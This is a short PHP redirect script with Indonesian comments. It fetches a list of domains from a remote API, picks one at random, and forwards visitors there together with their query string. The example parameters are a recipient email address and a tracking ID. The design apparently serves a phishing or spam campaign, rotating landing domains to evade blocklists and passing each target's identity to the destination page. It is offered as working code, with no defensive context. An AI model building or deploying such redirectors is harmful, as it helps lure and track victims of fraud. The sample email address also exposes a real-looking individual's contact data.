<?php

// 1. Alamat API untuk mengambil daftar domain
$apiUrl = 'https://api.beon.my.id/api/domainlist/index.php';

// 2. Mengambil data dari API
// Tanda @ digunakan untuk menekan pesan error default jika API gagal diakses
$jsonResponse = @file_get_contents($apiUrl);

// Cek jika API gagal diakses atau tidak mengembalikan data
if ($jsonResponse === false) {
    // Kamu bisa menampilkan pesan error atau redirect ke halaman fallback
    die("Error: Tidak dapat terhubung ke API domain.");
}

// 3. Decode response JSON menjadi array PHP
$domainList = json_decode($jsonResponse, true);

// Cek jika JSON tidak valid atau array kosong
if (json_last_error() !== JSON_ERROR_NONE || !is_array($domainList) || empty($domainList)) {
    die("Error: Format data dari API tidak valid atau kosong.");
}

// 4. Pilih satu domain secara acak (shuffle) dari daftar
$randomIndex = array_rand($domainList);
$chosenDomain = $domainList[$randomIndex];

// 5. Siapkan parameter yang akan diteruskan
// $_SERVER['QUERY_STRING'] berisi semua parameter dari URL awal
// contoh: "user=chama.3@i.softbank.jp&track=7d674317-8a49-48e9-bab1-296e3b0f47ad"
$queryString = $_SERVER['QUERY_STRING'];

// Gabungkan domain terpilih dengan parameter
// Pastikan ada query string sebelum menambahkan tanda tanya (?)
$finalUrl = $chosenDomain;
if (!empty($queryString)) {
    // Jika kamu ingin menambahkan path statis seperti '/spesial', ubah baris ini menjadi:
    // $finalUrl = rtrim($chosenDomain, '/') . '/spesial?' . $queryString;
    $finalUrl = rtrim($chosenDomain, '/') . '/?' . $queryString;
}

// 6. Lakukan redirect ke URL final
// header() mengirimkan HTTP header untuk mengarahkan browser
// exit() memastikan tidak ada kode lain yang dieksekusi setelah redirect
header("Location: " . $finalUrl);
exit();

?>
